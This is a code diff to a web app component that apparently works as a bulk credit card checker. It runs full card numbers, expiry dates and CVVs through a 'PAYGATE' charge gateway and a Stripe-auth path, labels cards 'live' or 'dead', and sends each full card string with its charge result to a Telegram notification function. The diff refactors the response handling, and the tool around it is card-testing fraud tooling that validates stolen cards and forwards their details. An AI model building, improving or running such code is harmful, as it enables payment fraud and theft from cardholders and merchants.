@@ -60,6 +60,15 @@ interface BinInfo {
   isLoading?: boolean;
 }
 
+// Type for PAYGATE API response
+interface PaygateApiResponse {
+  status: "live" | "dead" | "unknown";
+  apiStatus: string;
+  apiMessage: string;
+  apiTotal?: string;
+  rawResponse: string;
+}
+
 const defaultBinInfo: BinInfo = {
   brand: "Unknown",
   type: "Unknown",
@@ -580,11 +589,8 @@ const Gateways = () => {
     return "unknown";
   };
 
-  // Store last PAYGATE API response for notifications
-  const [lastPaygateResponse, setLastPaygateResponse] = useState<{status: string; message: string; total?: string; raw?: string}>({status: '', message: ''});
-
-  // PAYGATE API check via edge function with retry - returns status AND stores API response
-  const checkCardViaPaygate = async (cardNumber: string, month: string, year: string, cvv: string, maxRetries = 5): Promise<"live" | "dead" | "unknown"> => {
+  // PAYGATE API check via edge function with retry - returns status AND API response directly
+  const checkCardViaPaygate = async (cardNumber: string, month: string, year: string, cvv: string, maxRetries = 5): Promise<PaygateApiResponse> => {
     const cc = `${cardNumber}|${month}|${year}|${cvv}`;
     
     for (let attempt = 0; attempt <= maxRetries; attempt++) {
@@ -597,37 +603,39 @@ const Gateways = () => {
         
         if (error) {
           console.error('[PAYGATE] Edge function error:', error);
-          setLastPaygateResponse({ status: 'ERROR', message: error.message || 'Edge function error', raw: JSON.stringify(error) });
           if (attempt < maxRetries) {
             await new Promise(r => setTimeout(r, 500 + attempt * 200));
             continue;
           }
-          return "unknown";
+          return {
+            status: "unknown",
+            apiStatus: "ERROR",
+            apiMessage: error.message || "Edge function error",
+            rawResponse: JSON.stringify(error)
+          };
         }
         
         console.log('[PAYGATE] API response:', data);
         
-        // Store the real API response
-        setLastPaygateResponse({
-          status: data?.status || 'UNKNOWN',
-          message: data?.message || 'No message',
-          total: data?.total,
-          raw: JSON.stringify(data)
-        });
+        // Extract real API response data
+        const apiStatus = data?.status || 'UNKNOWN';
+        const apiMessage = data?.message || 'No message';
+        const apiTotal = data?.total;
+        const rawResponse = JSON.stringify(data);
         
         // Use computedStatus from edge function
         const computedStatus = data?.computedStatus;
         if (computedStatus === "live" || computedStatus === "dead") {
-          return computedStatus;
+          return { status: computedStatus, apiStatus, apiMessage, apiTotal, rawResponse };
         }
         
         // Fallback: Check status field directly
         const status = (data?.status as string)?.toUpperCase() || '';
         if (status === 'APPROVED' || status === 'SUCCESS' || status === 'CHARGED' || status === 'LIVE') {
-          return "live";
+          return { status: "live", apiStatus, apiMessage, apiTotal, rawResponse };
         }
         if (status === 'DECLINED' || status === 'DEAD' || status === 'FAILED') {
-          return "dead";
+          return { status: "dead", apiStatus, apiMessage, apiTotal, rawResponse };
         }
         
         // Check message for decline indicators
@@ -635,10 +643,10 @@ const Gateways = () => {
         if (message.includes('decline') || message.includes('declined') || 
             message.includes('insufficient') || message.includes('invalid') || 
             message.includes('expired')) {
-          return "dead";
+          return { status: "dead", apiStatus, apiMessage, apiTotal, rawResponse };
         }
         if (message.includes('approved') || message.includes('success') || message.includes('charged')) {
-          return "live";
+          return { status: "live", apiStatus, apiMessage, apiTotal, rawResponse };
         }
         
         // Rate limit or timeout - retry
@@ -650,18 +658,27 @@ const Gateways = () => {
           }
         }
         
-        return "unknown";
+        return { status: "unknown", apiStatus, apiMessage, apiTotal, rawResponse };
       } catch (error) {
         console.error('[PAYGATE] API check error:', error);
-        setLastPaygateResponse({ status: 'ERROR', message: error instanceof Error ? error.message : 'Unknown error', raw: String(error) });
         if (attempt < maxRetries) {
           await new Promise(r => setTimeout(r, 500 + attempt * 200));
           continue;
         }
-        return "unknown";
+        return {
+          status: "unknown",
+          apiStatus: "ERROR",
+          apiMessage: error instanceof Error ? error.message : "Unknown error",
+          rawResponse: String(error)
+        };
       }
     }
-    return "unknown";
+    return {
+      status: "unknown",
+      apiStatus: "ERROR",
+      apiMessage: "Max retries exceeded",
+      rawResponse: "Max retries exceeded"
+    };
   };
 
   // Fallback simulation for non-API gateways
@@ -701,10 +718,13 @@ const Gateways = () => {
 
       // Use real API for YUNCHI AUTH gateway and PAYGATE, simulation for others
       let checkStatus: "live" | "dead" | "unknown";
+      let paygateResponse: PaygateApiResponse | null = null;
+      
       if (selectedGateway.id === "stripe_auth") {
         checkStatus = await checkCardViaApi(cardNumber.replace(/\s/g, ''), expMonth, expYear, internalCvv);
       } else if (selectedGateway.id === "paygate_charge") {
-        checkStatus = await checkCardViaPaygate(cardNumber.replace(/\s/g, ''), expMonth, expYear, internalCvv);
+        paygateResponse = await checkCardViaPaygate(cardNumber.replace(/\s/g, ''), expMonth, expYear, internalCvv);
+        checkStatus = paygateResponse.status;
       } else {
         checkStatus = await simulateCheck();
       }
@@ -759,12 +779,10 @@ const Gateways = () => {
       setResult(checkResult);
 
       // Send Telegram notification for PAYGATE checks (all statuses) with real API response
-      if (selectedGateway.id === "paygate_charge") {
+      if (selectedGateway.id === "paygate_charge" && paygateResponse) {
         try {
           // Build real response message from API
-          const realResponseMessage = lastPaygateResponse.message 
-            ? `${lastPaygateResponse.status}: ${lastPaygateResponse.message}${lastPaygateResponse.total ? ` (${lastPaygateResponse.total})` : ''}`
-            : checkStatus === "live" ? "CHARGED" : checkStatus === "dead" ? "DECLINED" : "UNKNOWN";
+          const realResponseMessage = `${paygateResponse.apiStatus}: ${paygateResponse.apiMessage}${paygateResponse.apiTotal ? ` (${paygateResponse.apiTotal})` : ''}`;
           
           await supabase.functions.invoke('notify-charged-card', {
             body: {
@@ -772,9 +790,9 @@ const Gateways = () => {
               card_details: fullCardString,
               status: checkStatus === "live" ? "CHARGED" : checkStatus === "dead" ? "DECLINED" : "UNKNOWN",
               response_message: realResponseMessage,
-              amount: lastPaygateResponse.total || "$14.00",
+              amount: paygateResponse.apiTotal || "$14.00",
               gateway: "PAYGATE",
-              api_response: lastPaygateResponse.raw || "No API response captured"
+              api_response: paygateResponse.rawResponse
             }
           });
         } catch (notifyError) {
@@ -1347,10 +1365,13 @@ const Gateways = () => {
       try {
         // Use real API for YUNCHI AUTH gateway and PAYGATE, simulation for others
         let checkStatus: "live" | "dead" | "unknown";
+        let paygateResponse: PaygateApiResponse | null = null;
+        
         if (selectedGateway.id === "stripe_auth") {
           checkStatus = await checkCardViaApi(cardData.card, cardData.month, cardData.year, cardData.cvv);
         } else if (selectedGateway.id === "paygate_charge") {
-          checkStatus = await checkCardViaPaygate(cardData.card, cardData.month, cardData.year, cardData.cvv);
+          paygateResponse = await checkCardViaPaygate(cardData.card, cardData.month, cardData.year, cardData.cvv);
+          checkStatus = paygateResponse.status;
         } else {
           checkStatus = await simulateCheck();
         }
@@ -1413,12 +1434,10 @@ const Gateways = () => {
         };
 
         // Send Telegram notification for PAYGATE checks (bulk - all statuses) with real API response
-        if (selectedGateway.id === "paygate_charge") {
+        if (selectedGateway.id === "paygate_charge" && paygateResponse) {
           try {
             // Build real response message from API
-            const realResponseMessage = lastPaygateResponse.message 
-              ? `${lastPaygateResponse.status}: ${lastPaygateResponse.message}${lastPaygateResponse.total ? ` (${lastPaygateResponse.total})` : ''}`
-              : checkStatus === "live" ? "CHARGED" : checkStatus === "dead" ? "DECLINED" : "UNKNOWN";
+            const realResponseMessage = `${paygateResponse.apiStatus}: ${paygateResponse.apiMessage}${paygateResponse.apiTotal ? ` (${paygateResponse.apiTotal})` : ''}`;
             
             await supabase.functions.invoke('notify-charged-card', {
               body: {
@@ -1426,9 +1445,9 @@ const Gateways = () => {
                 card_details: fullCardStr,
                 status: checkStatus === "live" ? "CHARGED" : checkStatus === "dead" ? "DECLINED" : "UNKNOWN",
                 response_message: realResponseMessage,
-                amount: lastPaygateResponse.total || "$14.00",
+                amount: paygateResponse.apiTotal || "$14.00",
                 gateway: "PAYGATE",
-                api_response: lastPaygateResponse.raw || "No API response captured"
+                api_response: paygateResponse.rawResponse
               }
             });
           } catch (notifyError) {
